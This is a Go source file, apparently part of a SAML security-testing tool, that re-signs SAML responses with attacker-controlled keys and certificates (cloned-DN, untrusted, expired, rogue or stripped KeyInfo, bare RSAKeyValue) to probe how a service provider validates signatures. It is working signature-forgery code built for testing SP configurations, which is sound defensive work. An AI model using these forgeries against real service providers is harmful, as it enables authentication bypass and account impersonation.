package saml

import (
	"crypto"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/big"
	"sync"
	"time"

	"github.com/beevik/etree"
	dsig "github.com/russellhaering/goxmldsig"
)

// Signing key and certificate attacks. Each one answers a different question
// about the SP: whether it compares the signing certificate against the one it
// was configured with, or settles for a cert that merely looks right, carries
// the right name, or simply came along in the response.
const (
	SignKeyOff = ""
	// SignKeyClone signs with a fresh key under a certificate that copies the
	// real IdP certificate's subject, issuer, serial and validity. An SP that
	// matches on the DN or the serial rather than the key accepts it.
	SignKeyClone = "clone_dn"
	// SignKeyUntrusted signs with a key and certificate that have no relation
	// to the IdP at all. Anything that accepts this is not checking the
	// certificate against its configuration.
	SignKeyUntrusted = "untrusted"
	// SignKeyExpired and SignKeyNotYetValid sign with a cloned-DN certificate
	// outside its validity window, in the past and in the future.
	SignKeyExpired     = "expired"
	SignKeyNotYetValid = "not_yet_valid"
	// SignKeyRogueKeyInfo leaves the real signature intact and only swaps the
	// certificate advertised in KeyInfo. An SP that validates against KeyInfo
	// instead of its configured certificate reports a mismatch; one that
	// ignores KeyInfo accepts it.
	SignKeyRogueKeyInfo = "rogue_keyinfo"
	// SignKeyStripKeyInfo removes KeyInfo entirely. A correct SP falls back to
	// its configured certificate and still validates.
	SignKeyStripKeyInfo = "strip_keyinfo"
	// SignKeyRawKeyValue signs with attacker key material and advertises that
	// key as a bare ds:RSAKeyValue instead of a certificate. An SP that hands
	// the document's key material to its verifier, rather than restricting the
	// verifier to the certificate it was configured with, accepts it.
	SignKeyRawKeyValue = "raw_keyvalue"
)

// SignKeyModes lists the modes in the order the tamper page offers them.
var SignKeyModes = []string{
	SignKeyClone,
	SignKeyUntrusted,
	SignKeyExpired,
	SignKeyNotYetValid,
	SignKeyRogueKeyInfo,
	SignKeyStripKeyInfo,
	SignKeyRawKeyValue,
}

// SignKeyModeLabels are the human-readable names shown in the UI and recorded
// in the inspector.
var SignKeyModeLabels = map[string]string{
	SignKeyClone:        "self-signed clone of the IdP certificate",
	SignKeyUntrusted:    "unrelated key and certificate",
	SignKeyExpired:      "expired certificate",
	SignKeyNotYetValid:  "not-yet-valid certificate",
	SignKeyRogueKeyInfo: "rogue certificate in KeyInfo",
	SignKeyStripKeyInfo: "KeyInfo removed",
	SignKeyRawKeyValue:  "attacker key advertised as a bare RSAKeyValue",
}

func IsSignKeyMode(mode string) bool {
	_, ok := SignKeyModeLabels[mode]
	return ok
}

// Resigner replaces the signature on an already-signed SAML response with one
// made under attacker-controlled key material. It works after the library has
// signed, rather than swapping the IdP's key for the request, because the key
// on saml.IdentityProvider is read by every concurrent login.
type Resigner struct {
	realKey  *rsa.PrivateKey
	realCert *x509.Certificate

	mu       sync.Mutex
	material map[string]*signMaterial
}

type signMaterial struct {
	key  *rsa.PrivateKey
	cert *x509.Certificate
}

// NewResigner takes the real IdP key as well as the certificate: the modes that
// only rewrite KeyInfo have to re-sign the response afterwards, and that outer
// signature has to stay the IdP's own so the SP evaluates the KeyInfo rather
// than an unexpected signer.
func NewResigner(realKey *rsa.PrivateKey, realCert *x509.Certificate) *Resigner {
	return &Resigner{realKey: realKey, realCert: realCert, material: map[string]*signMaterial{}}
}

// keyInfoOnlyMode reports whether a mode leaves the signature alone and only
// changes the key material it advertises.
func keyInfoOnlyMode(mode string) bool {
	return mode == SignKeyStripKeyInfo || mode == SignKeyRogueKeyInfo
}

// fingerprint is the SHA-256 of the DER, formatted the way SP admin UIs
// usually show it, so the operator can tell which certificate was used.
func fingerprint(cert *x509.Certificate) string {
	sum := sha256.Sum256(cert.Raw)
	return hex.EncodeToString(sum[:])
}

// materialFor generates the key and certificate for a mode once and reuses
// them, so repeated logins in a sweep present the same attacker certificate
// and the SP's behaviour stays comparable between attempts.
func (r *Resigner) materialFor(mode string) (*signMaterial, error) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if m, ok := r.material[mode]; ok {
		return m, nil
	}

	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, fmt.Errorf("generate attack key: %w", err)
	}

	now := time.Now()
	tmpl := &x509.Certificate{
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth, x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
		IsCA:                  true,
	}

	switch mode {
	case SignKeyUntrusted, SignKeyRogueKeyInfo, SignKeyRawKeyValue:
		serial, err := randomSerial()
		if err != nil {
			return nil, err
		}
		tmpl.SerialNumber = serial
		tmpl.Subject = pkix.Name{
			Organization: []string{"Plasmid Attacker"},
			CommonName:   "plasmid-attacker",
		}
		tmpl.NotBefore = now.Add(-time.Hour)
		tmpl.NotAfter = now.AddDate(1, 0, 0)
	default:
		// The remaining modes impersonate the real IdP certificate, so they
		// copy everything that identifies it except the key.
		if r.realCert == nil {
			return nil, fmt.Errorf("signing mode %q needs the IdP certificate", mode)
		}
		tmpl.SerialNumber = r.realCert.SerialNumber
		tmpl.Subject = r.realCert.Subject
		switch mode {
		case SignKeyExpired:
			tmpl.NotBefore = now.AddDate(-2, 0, 0)
			tmpl.NotAfter = now.AddDate(-1, 0, 0)
		case SignKeyNotYetValid:
			tmpl.NotBefore = now.AddDate(1, 0, 0)
			tmpl.NotAfter = now.AddDate(2, 0, 0)
		default:
			tmpl.NotBefore = r.realCert.NotBefore
			tmpl.NotAfter = r.realCert.NotAfter
		}
	}

	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return nil, fmt.Errorf("generate attack certificate: %w", err)
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return nil, fmt.Errorf("parse attack certificate: %w", err)
	}

	m := &signMaterial{key: key, cert: cert}
	r.material[mode] = m
	return m, nil
}

func randomSerial() (*big.Int, error) {
	serial, err := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	if err != nil {
		return nil, fmt.Errorf("generate serial number: %w", err)
	}
	return serial, nil
}

// Apply rewrites the signatures on a SAML response according to mode and
// returns the new XML plus a description of what it did.
func (r *Resigner) Apply(xmlBytes []byte, mode string) ([]byte, string, error) {
	if !IsSignKeyMode(mode) {
		return nil, "", fmt.Errorf("unknown signing key mode %q", mode)
	}

	doc := etree.NewDocument()
	if err := doc.ReadFromBytes(xmlBytes); err != nil {
		return nil, "", fmt.Errorf("parse failed: %w", err)
	}
	response := doc.Root()
	if response == nil {
		return nil, "", fmt.Errorf("no root element")
	}

	// Both the response and the assertion may carry a signature; whichever are
	// present get the same treatment, so the SP cannot fall back to the other.
	// The assertion comes first: a response signature covers the assertion, so
	// rewriting the assertion afterwards would leave the outer digest stale.
	targets := []*etree.Element{}
	if assertion := findElement(response, "saml", "Assertion"); assertion != nil && findSignature(assertion) != nil {
		targets = append(targets, assertion)
	}
	if findSignature(response) != nil {
		targets = append(targets, response)
	}
	if len(targets) == 0 {
		return nil, "", fmt.Errorf("response carries no signature to replace")
	}

	material, err := r.materialFor(mode)
	if err != nil {
		return nil, "", err
	}

	responseSigned := findSignature(response) != nil
	assertion := findElement(response, "saml", "Assertion")

	for _, el := range targets {
		switch mode {
		case SignKeyStripKeyInfo:
			stripKeyInfo(el)
		case SignKeyRogueKeyInfo:
			replaceKeyInfoCert(el, material.cert)
		case SignKeyRawKeyValue:
			if err := resignElement(el, material); err != nil {
				return nil, "", err
			}
			replaceKeyInfoWithRawKey(el, &material.key.PublicKey)
		default:
			if err := resignElement(el, material); err != nil {
				return nil, "", err
			}
		}

		// A response signature covers the assertion. The modes that only rewrite
		// KeyInfo leave the assertion's signature in place, so the outer digest
		// goes stale and the SP rejects on the digest without ever evaluating the
		// key material. Refreshing the response signature with the real IdP key
		// leaves the advertised key as the only anomaly. The response is the next
		// target in the loop, so its own KeyInfo is rewritten after this.
		if keyInfoOnlyMode(mode) && el == assertion && responseSigned {
			if r.realKey == nil {
				return nil, "", fmt.Errorf("signing mode %q needs the IdP key to refresh the response signature", mode)
			}
			real := &signMaterial{key: r.realKey, cert: r.realCert}
			if err := resignElement(response, real); err != nil {
				return nil, "", fmt.Errorf("refresh response signature: %w", err)
			}
		}
	}

	out, err := doc.WriteToBytes()
	if err != nil {
		return nil, "", fmt.Errorf("serialize failed: %w", err)
	}

	desc := SignKeyModeLabels[mode]
	if mode != SignKeyStripKeyInfo && mode != SignKeyRawKeyValue {
		desc += " (sha256 " + fingerprint(material.cert)[:16] + "…)"
	}
	return out, desc, nil
}

// resignElement drops the existing signature and signs the element again with
// the attacker's key, leaving the signature where the SAML schema expects it.
func resignElement(el *etree.Element, m *signMaterial) error {
	removeSignature(el)

	keyPair := tls.Certificate{
		Certificate: [][]byte{m.cert.Raw},
		PrivateKey:  crypto.PrivateKey(m.key),
		Leaf:        m.cert,
	}
	ctx := dsig.NewDefaultSigningContext(dsig.TLSCertKeyStore(keyPair))
	// Match the library's own canonicalizer and digest so the only thing that
	// changed between a normal response and this one is the key material.
	ctx.Canonicalizer = dsig.MakeC14N10ExclusiveCanonicalizerWithPrefixList("")
	if err := ctx.SetSignatureMethod(dsig.RSASHA256SignatureMethod); err != nil {
		return fmt.Errorf("set signature method: %w", err)
	}

	signed, err := ctx.SignEnveloped(el)
	if err != nil {
		return fmt.Errorf("re-sign failed: %w", err)
	}

	// SignEnveloped works on a copy, so take the signature out of it and graft
	// it onto the original element. Detaching first reparents it cleanly.
	sig := findSignature(signed)
	if sig == nil {
		return fmt.Errorf("re-sign produced no signature")
	}
	signed.RemoveChild(sig)

	// It was appended last, but both Response and Assertion put ds:Signature
	// directly after saml:Issuer, and an SP validating against the schema
	// rejects it anywhere else.
	el.InsertChildAt(issuerIndex(el), sig)
	return nil
}

// issuerIndex returns the position a signature belongs at: right after Issuer
// when there is one, first otherwise.
func issuerIndex(el *etree.Element) int {
	for i, child := range el.Child {
		if child, ok := child.(*etree.Element); ok && child.Tag == "Issuer" {
			return i + 1
		}
	}
	return 0
}

func stripKeyInfo(el *etree.Element) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	if keyInfo := findElement(sig, "ds", "KeyInfo"); keyInfo != nil {
		sig.RemoveChild(keyInfo)
	}
}

// replaceKeyInfoWithRawKey swaps the certificate in KeyInfo for the bare RSA
// public key. KeyInfo sits outside SignedInfo, so the signature stays intact.
func replaceKeyInfoWithRawKey(el *etree.Element, pub *rsa.PublicKey) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	if keyInfo := findElement(sig, "ds", "KeyInfo"); keyInfo != nil {
		sig.RemoveChild(keyInfo)
	}
	keyInfo := sig.CreateElement("ds:KeyInfo")
	rsaKey := keyInfo.CreateElement("ds:KeyValue").CreateElement("ds:RSAKeyValue")
	rsaKey.CreateElement("ds:Modulus").SetText(base64.StdEncoding.EncodeToString(pub.N.Bytes()))
	rsaKey.CreateElement("ds:Exponent").SetText(base64.StdEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes()))
}

func replaceKeyInfoCert(el *etree.Element, cert *x509.Certificate) {
	sig := findSignature(el)
	if sig == nil {
		return
	}
	certEl := findElementRecursive(sig, "ds", "X509Certificate")
	if certEl == nil {
		return
	}
	certEl.SetText(base64.StdEncoding.EncodeToString(cert.Raw))
}
